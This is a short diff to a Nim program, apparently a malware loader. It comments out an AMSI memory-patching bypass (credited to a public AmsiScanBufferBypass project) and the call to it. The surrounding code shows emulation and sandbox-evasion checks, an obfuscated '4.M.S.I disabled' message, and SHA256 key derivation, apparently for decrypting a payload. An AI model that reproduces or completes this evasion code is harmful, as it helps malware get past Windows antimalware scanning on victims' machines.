@@ -159,6 +159,7 @@ proc isEmulated(): bool =
     return false
 
 
+#[
 proc amsiPatchMemory(): bool =
     # Based on: https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/main/AmsiBypass.cs
     const
@@ -205,6 +206,7 @@ proc amsiPatchMemory(): bool =
         return true
 
     return false
+]#
 
 
 proc sleepAndCheck(): bool =
@@ -239,8 +241,8 @@ when isMainModule:
         quit()
 
     # Patch AMSI
-    if amsiPatchMemory():
-        echo "[+] 4.M.S.I disabled!"
+    #if amsiPatchMemory():
+        #echo "[+] 4.M.S.I disabled!"
 
     # KDF based on SHA256
     var expKey = sha256.digest(password)
